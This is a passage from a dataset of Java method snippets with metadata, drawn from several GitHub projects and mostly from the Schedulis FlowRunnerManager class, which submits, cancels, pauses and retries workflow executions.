"https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55876, "method_name": "isSingleValue", "class_name": "Criterion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isSingleValue() {\n            return singleValue;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55877, "method_name": "isBetweenValue", "class_name": "Criterion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isBetweenValue() {\n            return betweenValue;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55878, "method_name": "isListValue", "class_name": "Criterion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isListValue() {\n            return listValue;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55879, "method_name": "getTypeHandler", "class_name": "Criterion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getTypeHandler() {\n            return typeHandler;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55880, "method_name": "initElements", "class_name": "MossySettsBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/MossySettsBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 55881, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/MossySettsBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 55882, "method_name": "setTemplateDir", "class_name": "ThreadLocalUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setTemplateDir(String dir){\n        templateDir.set(dir);\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/core/utils/ThreadLocalUtil.java", "stars": "137", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55883, "method_name": "getTemplateDir", "class_name": "ThreadLocalUtil", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTemplateDir(){\n        CacheService cacheService = SpringUtil.getBean(CacheService.class);\n        String prefix = cacheService.get(CacheKey.TEMPLATE_DIR_KEY+clientId.get());\n        if(prefix != null){\n            return prefix;\n        }\n        return templateDir.get();\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/core/utils/ThreadLocalUtil.java", "stars": "137", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55884, "method_name": "setCientId", "class_name": "ThreadLocalUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setCientId(String id){\n        clientId.set(id);\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-front/src/main/java/com/java2nb/novel/core/utils/ThreadLocalUtil.java", "stars": "137", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55885, "method_name": "doTest", "class_name": "OrdependTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void doTest() {\n        test2();\n//        test1();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/app/src/main/java/com/qiyi/tm/demo/test/OrdependTest.java", "stars": "50", "class_props": {"extends": "Test", "implements": null, "modifiers": ["public"]}}, {"id": 55886, "method_name": "test1", "class_name": "OrdependTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void test1() {\n        Task task1 = new Task(\"task1\", R.id.tash_v1) {\n            @Override\n            public void doTask() {\n\n            }\n        };\n        //getTask(\"task1\");\n        Task task2 = new Task(\"task2\", R.id.tash_v1) {\n            @Override\n            public void doTask() {\n\n            }\n        };\n        //getTask(\"task2\");\n        Task task3 = getTask(\"task3\");\n        task1.postUIDelay(3000);\n        task2.postAsyncDelay(500);\n        task3.dependOn(task1)\n                .orDependOn(task2)\n                .postAsync();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/app/src/main/java/com/qiyi/tm/demo/test/OrdependTest.java", "stars": "50", "class_props": {"extends": "Test", "implements": null, "modifiers": ["public"]}}, {"id": 55887, "method_name": "test2", "class_name": "OrdependTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void test2() {\n        Task task1 = new Task(\"task1\", R.id.tash_v1) {\n            @Override\n            public void doTask() {\n\n            }\n        };\n        //getTask(\"task1\");\n        Task task2 = new Task(\"task2\", R.id.tash_v1) {\n            @Override\n            public void doTask() {\n\n            }\n        };\n        //getTask(\"task2\");\n\n        Task task3 = getTask(\"task3\");\n\n        task1.postUIDelay(3000);\n        task2.postAsyncDelay(3500);\n        task3.dependOn(task1.getTaskId())\n                .orDependOn(task2.getTaskId())\n//                .postAsyncDelay(6000);\n                .postAsync();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/app/src/main/java/com/qiyi/tm/demo/test/OrdependTest.java", "stars": "50", "class_props": {"extends": "Test", "implements": null, "modifiers": ["public"]}}, {"id": 55888, "method_name": "doGet", "class_name": "ConfigDemoServlet", "params": ["HttpServletRequest", "HttpServletResponse"], "throws": ["IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"text/html\");\n        response.setCharacterEncoding(\"utf-8\");\n        // \u8f93\u51fa\u6587\u672c\n        PrintWriter out = response.getWriter();\n        out.write(\"<p>Servlet\u540d\u79f0\uff1a\" + this.getServletName() + \"</p>\");\n        out.write(\"<p>Email\u5730\u5740\uff1a\" + this.getServletContext().getInitParameter(\"email\") + \"</p>\");\n        out.write(\"<p>\u7535\u8bdd\uff1a\" + this.getServletContext().getInitParameter(\"telephone\") + \"</p>\");\n\n    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework01/src/com/fehead/ConfigDemoServlet.java", "stars": "4", "class_props": {"extends": "HttpServlet", "implements": null, "modifiers": ["public"]}}, {"id": 55889, "method_name": "getProjectDirCacheHitRatio", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "  public double getProjectDirCacheHitRatio() {\n    return this.flowPreparer.getProjectDirCacheHitRatio();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55890, "method_name": "setgidPermissionOnExecutionDirectory", "class_name": "FlowRunnerManager", "params": [], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void setgidPermissionOnExecutionDirectory() throws IOException {\n    logger.info(\"Creating subprocess to run shell command: chmod g+s \"\n        + this.executionDirectory.toString());\n    Runtime.getRuntime().exec(\"chmod g+s \" + this.executionDirectory.toString());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55891, "method_name": "createExecutorService", "class_name": "FlowRunnerManager", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "TrackingThreadPool", "snippet": "  private TrackingThreadPool createExecutorService(final int nThreads) {\n    final boolean useNewThreadPool =\n        this.azkabanProps.getBoolean(EXECUTOR_USE_BOUNDED_THREADPOOL_QUEUE, false);\n    logger.info(\"useNewThreadPool: \" + useNewThreadPool);\n\n    if (useNewThreadPool) {\n      this.threadPoolQueueSize =\n          this.azkabanProps.getInt(EXECUTOR_THREADPOOL_WORKQUEUE_SIZE, nThreads);\n      logger.info(\"workQueueSize: \" + this.threadPoolQueueSize);\n\n      // using a bounded queue for the work queue. The default rejection policy\n      // {@ThreadPoolExecutor.AbortPolicy} is used\n      final TrackingThreadPool executor =\n          new TrackingThreadPool(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS,\n              new LinkedBlockingQueue<>(this.threadPoolQueueSize), this);\n\n      return executor;\n    } else {\n      // the old way of using unbounded task queue.\n      // if the running tasks are taking a long time or stuck, this queue\n      // will be very very long.\n      return new TrackingThreadPool(nThreads, nThreads, 0L,\n          TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>(), this);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55892, "method_name": "setExecutorActive", "class_name": "FlowRunnerManager", "params": ["boolean", "String", "int"], "throws": ["ExecutorManagerException", "InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setExecutorActive(final boolean isActive, final String host, final int port)\n      throws ExecutorManagerException, InterruptedException {\n    final Executor executor = this.executorLoader.fetchExecutor(host, port);\n    Preconditions.checkState(executor != null, \"Unable to obtain self entry in DB\");\n    if (executor.isActive() != isActive) {\n      executor.setActive(isActive);\n      this.executorLoader.updateExecutor(executor);\n    } else {\n      logger.info(\n          \"Set active action ignored. Executor is already \" + (isActive ? \"active\" : \"inactive\"));\n    }\n    this.active = isActive;\n    if (!this.active) {\n      // When deactivating this executor, this call will wait to return until every thread in {@link\n      // #createFlowRunner} has finished. When deploying new executor, old running executor will be\n      // deactivated before new one is activated and only one executor is allowed to\n      // delete/hard-linking project dirs to avoid race condition described in {@link\n      // FlowPreparer#setup}. So to make deactivation process block until flow preparation work\n      // finishes guarantees the old executor won't access {@link FlowPreparer#setup} after\n      // deactivation.\n      waitUntilFlowPreparationFinish();\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55893, "method_name": "waitUntilFlowPreparationFinish", "class_name": "FlowRunnerManager", "params": [], "throws": ["InterruptedException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void waitUntilFlowPreparationFinish() throws InterruptedException {\n    final Duration SLEEP_INTERVAL = Duration.ofSeconds(5);\n    while (this.preparingFlowCount.intValue() != 0) {\n      logger.info(this.preparingFlowCount + \" flow(s) is/are still being setup before complete \"\n          + \"deactivation.\");\n      Thread.sleep(SLEEP_INTERVAL.toMillis());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55894, "method_name": "getLastFlowSubmittedTime", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getLastFlowSubmittedTime() {\n    // Note: this is not thread safe and may result in providing dirty data.\n    //       we will provide this data as is for now and will revisit if there\n    //       is a string justification for change.\n    return this.lastFlowSubmittedDate;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55895, "method_name": "getGlobalProps", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getGlobalProps() {\n    return this.globalProps;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55896, "method_name": "setGlobalProps", "class_name": "FlowRunnerManager", "params": ["Props"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setGlobalProps(final Props globalProps) {\n    this.globalProps = globalProps;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55897, "method_name": "submitFlow", "class_name": "FlowRunnerManager", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void submitFlow(final int execId) throws ExecutorManagerException {\n    if (isAlreadyRunning(execId)) {\n      return;\n    }\n\n    final FlowRunner runner = createFlowRunner(execId);\n\n    // Check again.\n    if (isAlreadyRunning(execId)) {\n      return;\n    }\n    submitFlowRunner(runner);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55898, "method_name": "isAlreadyRunning", "class_name": "FlowRunnerManager", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isAlreadyRunning(final int execId) throws ExecutorManagerException {\n    if (this.runningFlows.containsKey(execId)) {\n      logger.info(\"Execution \" + execId + \" is already in running.\");\n      if (!this.submittedFlows.containsValue(execId)) {\n        // Execution had been added to running flows but not submitted - something's wrong.\n        // Return a response with error: this is a cue for the dispatcher to retry or finalize the\n        // execution as failed.\n        throw new ExecutorManagerException(\"Execution \" + execId +\n            \" is in runningFlows but not in submittedFlows. Most likely submission had failed.\");\n      }\n      // Already running, everything seems fine. Report as a successful submission.\n      return true;\n    }\n    return false;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55899, "method_name": "isExecutorSpecified", "class_name": "FlowRunnerManager", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isExecutorSpecified(final ExecutableFlow flow) {\n    return flow.getExecutionOptions().getFlowParameters()\n        .containsKey(ExecutionOptions.USE_EXECUTOR);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55900, "method_name": "createFlowRunner", "class_name": "FlowRunnerManager", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "FlowRunner", "snippet": "  private FlowRunner createFlowRunner(final int execId) throws ExecutorManagerException {\n    final ExecutableFlow flow;\n    flow = this.executorLoader.fetchExecutableFlow(execId);\n    if (flow == null) {\n      throw new ExecutorManagerException(\"Error loading flow with exec \"\n          + execId);\n    }\n\n    // Sets up the project files and execution directory.\n    this.preparingFlowCount.incrementAndGet();\n    // Record the time between submission, and when the flow preparation/execution starts.\n    // Note that since submit time is recorded on the web server, while flow preparation is on\n    // the executor, there could be some inaccuracies due to clock skew.\n    commonMetrics.addQueueWait(System.currentTimeMillis() -\n        flow.getExecutableFlow().getSubmitTime());\n\n    final Timer.Context flowPrepTimerContext = commonMetrics.getFlowSetupTimerContext();\n\n    try {\n      if (this.active || isExecutorSpecified(flow)) {\n        this.flowPreparer.setup(flow);\n      } else {\n        // Unset the executor.\n        this.executorLoader.unsetExecutorIdForExecution(execId);\n        throw new ExecutorManagerException(\"executor became inactive before setting up the \"\n            + \"flow \" + execId);\n      }\n    } finally {\n      this.preparingFlowCount.decrementAndGet();\n      flowPrepTimerContext.stop();\n    }\n\n    // Setup flow runner\n    FlowWatcher watcher = null;\n    final ExecutionOptions options = flow.getExecutionOptions();\n    if (options.getPipelineExecutionId() != null) {\n      final Integer pipelineExecId = options.getPipelineExecutionId();\n      final FlowRunner runner = this.runningFlows.get(pipelineExecId);\n\n      if (runner != null) {\n        watcher = new LocalFlowWatcher(runner);\n      } else {\n        // also ends up here if execute is called with pipelineExecId that's not running any more\n        // (it could have just finished, for example)\n        watcher = new RemoteFlowWatcher(pipelineExecId, this.executorLoader);\n      }\n    }\n\n    int numJobThreads = this.numJobThreadPerFlow;\n    if (options.getFlowParameters().containsKey(FLOW_NUM_JOB_THREADS)) {\n      try {\n        final int numJobs =\n            Integer.valueOf(options.getFlowParameters().get(\n                FLOW_NUM_JOB_THREADS));\n        if (numJobs > 0 && (numJobs <= numJobThreads || ProjectWhitelist\n            .isProjectWhitelisted(flow.getProjectId(),\n                WhitelistType.NumJobPerFlow))) {\n          numJobThreads = numJobs;\n        }\n      } catch (final Exception e) {\n        throw new ExecutorManagerException(\n            \"Failed to set the number of job threads \"\n                + options.getFlowParameters().get(FLOW_NUM_JOB_THREADS)\n                + \" for flow \" + execId, e);\n      }\n    }\n\n    final FlowRunner runner =\n        new FlowRunner(flow, this.executorLoader, this.projectLoader, this.jobtypeManager,\n            this.azkabanProps, this.azkabanEventReporter, this.alerterHolder);\n    runner.setFlowWatcher(watcher)\n        .setJobLogSettings(this.jobLogChunkSize, this.jobLogNumFiles)\n        .setValidateProxyUser(this.validateProxyUser)\n        .setNumJobThreads(numJobThreads).addListener(this);\n\n    // FIXME\u00a0Add a listener for loop execution, and continue to submit new tasks when the job stream execution is complete.\n    EventListener cycleFlowRunnerEventListener = new CycleFlowRunnerEventListener(executionCycleDao, azkabanProps, alerterHolder);\n    runner.setCycleFlowRunnerEventListener(cycleFlowRunnerEventListener);\n    runner.addListener(cycleFlowRunnerEventListener);\n    configureFlowLevelMetrics(runner);\n    return runner;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55901, "method_name": "submitFlowRunner", "class_name": "FlowRunnerManager", "params": ["FlowRunner"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void submitFlowRunner(final FlowRunner runner) throws ExecutorManagerException {\n    this.runningFlows.put(runner.getExecutionId(), runner);\n    try {\n      // The executorService already has a queue.\n      // The submit method below actually returns an instance of FutureTask,\n      // which implements interface RunnableFuture, which extends both\n      // Runnable and Future interfaces\n      final Future<?> future = this.executorService.submit(runner);\n      // keep track of this future\n      this.submittedFlows.put(future, runner.getExecutionId());\n      // update the last submitted time.\n      this.lastFlowSubmittedDate = System.currentTimeMillis();\n    } catch (final RejectedExecutionException re) {\n      this.runningFlows.remove(runner.getExecutionId());\n      final StringBuffer errorMsg = new StringBuffer(\n          \"Azkaban executor can't execute any more flows. \");\n      if (this.executorService.isShutdown()) {\n        errorMsg.append(\"The executor is being shut down.\");\n      }\n      throw new ExecutorManagerException(errorMsg.toString(), re);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55902, "method_name": "configureFlowLevelMetrics", "class_name": "FlowRunnerManager", "params": ["FlowRunner"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void configureFlowLevelMetrics(final FlowRunner flowRunner) {\n    logger.info(\"Configuring Azkaban metrics tracking for flow runner object\");\n\n    if (MetricReportManager.isAvailable()) {\n      final MetricReportManager metricManager = MetricReportManager.getInstance();\n      // Adding NumFailedFlow Metric listener\n      flowRunner.addListener((NumFailedFlowMetric) metricManager\n          .getMetricFromName(NumFailedFlowMetric.NUM_FAILED_FLOW_METRIC_NAME));\n    }\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55903, "method_name": "cancelJobBySLA", "class_name": "FlowRunnerManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void cancelJobBySLA(final int execId, final String jobId)\n      throws ExecutorManagerException {\n    final FlowRunner flowRunner = this.runningFlows.get(execId);\n\n    if (flowRunner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n          + \" is not running.\");\n    }\n    // FIXME\u00a0Added support for killing subflow and subflow jobs.\n    for (final JobRunner jobRunner : flowRunner.getActiveJobRunners()) {\n      if (jobRunner.getNode().getNestedId().equals(jobId)) {\n        logger.info(\"Killing job or embededflow job: \" + jobId + \" in execution \" + execId + \" by SLA\");\n        jobRunner.killBySLA();\n        break;\n      } else if(jobRunner.getNode().getNestedId().startsWith(jobId)){\n        logger.info(\"embededflow: \" + jobId + \" , killing current active job : \" + jobRunner.getNode().getNestedId() + \" in execution \" + execId + \" by SLA\");\n        jobRunner.killBySLA();\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55904, "method_name": "cancelFlow", "class_name": "FlowRunnerManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void cancelFlow(final int execId, final String user)\n      throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n          + \" is not running.\");\n    }\n    runner.kill(user);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55905, "method_name": "superKill", "class_name": "FlowRunnerManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void superKill(final int execId, final String user)\n      throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n          + \" is not running.\");\n    }\n    runner.superKill(user);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55906, "method_name": "pauseFlow", "class_name": "FlowRunnerManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void pauseFlow(final int execId, final String user)\n      throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n          + \" is not running.\");\n    }\n\n    runner.pause(user);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55907, "method_name": "setFlowFailed", "class_name": "FlowRunnerManager", "params": ["int", "JSONObject"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFlowFailed(final int execId, final JSONObject json) throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n              + \" is not running.\");\n    }\n    if(!runner.setFlowFailed(json)){\n      throw new ExecutorManagerException(\"Execution:\" + execId + \" is not paused or has finished.\");\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55908, "method_name": "setJobDisabled", "class_name": "FlowRunnerManager", "params": ["int", "String", "Map<String,Object>", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setJobDisabled(final int execId, String disableJob, Map<String, Object> respMap, String user) throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n              + \" is not running.\");\n    }\n    runner.setJobDisabled(disableJob, respMap, user);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55909, "method_name": "retryJobs", "class_name": "FlowRunnerManager", "params": ["int", "List<String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void retryJobs(final int execId, List<String> retryFailedJobs) throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n              + \" is not running.\");\n    }\n    String message = null;\n    try{\n      message = runner.retryFailedJobs(retryFailedJobs);\n    } catch (Exception e){\n      throw new ExecutorManagerException(e.getMessage());\n    }\n    if(message != null){\n      throw new ExecutorManagerException(message);\n    }\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55910, "method_name": "skipFailedJobs", "class_name": "FlowRunnerManager", "params": ["int", "List<String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void skipFailedJobs(final int execId, List<String> skipFailedJobs) throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n              + \" is not running.\");\n    }\n    String message =  runner.setSkipFailedJob(skipFailedJobs);\n    if(message != null){\n      throw new ExecutorManagerException(message);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55911, "method_name": "setFlowFailed", "class_name": "FlowRunnerManager", "params": ["int", "boolean"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFlowFailed(final int execId, final boolean flowFailed) throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n              + \" is not running.\");\n    }\n\n    runner.setFlowFailed(flowFailed);\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55912, "method_name": "resumeFlow", "class_name": "FlowRunnerManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void 